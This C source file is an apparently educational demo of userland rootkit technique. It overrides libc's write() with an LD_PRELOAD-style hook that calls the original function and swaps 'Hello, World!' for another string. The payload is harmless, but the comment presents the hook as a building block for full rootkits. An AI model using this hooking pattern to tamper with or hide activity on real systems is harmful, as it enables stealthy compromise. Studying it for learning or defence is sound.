/*
 * Creating a malicious shared library object to hook syscalls for our purposes.
 * Point is to learn how to hook a system call, make it do something else and
 * still retain its original functionality so it looks like it is operating as
 * normal. User-land rootkit building block, and would definitely be a part of
 * a full rootkit/bootkit.
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>

ssize_t write(int fd, const void *buf, size_t bytes) {

	ssize_t (*new_write)(int fd, const void *buf, size_t bytes);
	ssize_t result;

	new_write = dlsym(RTLD_NEXT, "write");

	if (strcmp(buf, "Hello, World!") == 0) {
		result = new_write(fd, "Goodbye, cruel world!", 21);
	} else {
		result = new_write(fd, buf, bytes);
	}
	return result;
}
